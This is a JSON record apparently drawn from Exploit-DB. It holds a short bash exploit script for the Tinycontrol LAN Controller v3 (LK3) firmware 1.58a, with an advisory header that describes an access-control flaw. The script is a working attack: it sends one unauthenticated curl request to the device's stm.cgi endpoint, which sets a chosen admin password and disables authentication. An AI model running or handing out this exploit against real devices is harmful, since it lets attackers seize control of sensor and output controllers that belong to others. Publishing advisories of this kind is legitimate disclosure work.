{"source": "https://www.exploit-db.com/exploits/51732", "vulnName": "Tinycontrol LAN Controller v3 (LK3) 1.58a - Remote Admin Password Change", "vulnEDBID": "51732", "vulnCVE": "N/A", "author": "LIQUIDWORM", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2023-10-09", "vulnContent": "#!/bin/bash\n: \"\nExploit Title: Tinycontrol LAN Controller v3 (LK3) 1.58a - Remote Admin Password Change\nExploit Author: LiquidWorm\n\nVendor: Tinycontrol\nProduct web page: https://www.tinycontrol.pl\nAffected version: <=1.58a, HW 3.8\n\nSummary: Lan Controller is a very universal\ndevice that allows you to connect many different\nsensors and remotely view their readings and\nremotely control various types of outputs.\nIt is also possible to combine both functions\ninto an automatic if -> this with a calendar\nwhen -> then. The device provides a user interface\nin the form of a web page. The website presents\nreadings of various types of sensors: temperature,\nhumidity, pressure, voltage, current. It also\nallows you to configure the device, incl. event\nsetting and controlling up to 10 outputs. Thanks\nto the support of many protocols, it is possible\nto operate from smartphones, collect and observ\nthe results on the server, as well as cooperation\nwith other I/O systems based on TCP/IP and Modbus.\n\nDesc: The application suffers from an insecure access\ncontrol allowing an unauthenticated attacker to\nchange accounts passwords and bypass authentication\ngaining panel control access.\n\nTested on: lwIP\n\n\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\n                            @zeroscience\n\n\nAdvisory ID: ZSL-2023-5787\nAdvisory ID: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5787.php\n\n\n18.08.2023\n\n\"\n\nset -euo pipefail\nIFS=$'\\n\\t'\n\nif [ $# -ne 2 ]; then\n    echo -ne '\\nUsage: $0 [ipaddr] [desired admin pwd]\\n\\n'\n    exit\nfi\n\nIP=$1\nPW=$2\n\nEN=$(echo -n $PW | base64)\n\ncurl -s http://$IP/stm.cgi?auth=00YWRtaW4=*$EN*dXNlcg==*dXNlcg==\n# ?auth=00 (disable authentication, disable upgrade), https://docs.tinycontrol.pl/en/lk3/api/access/\necho -ne '\\nAdmin password changed to: '$PW\n            "}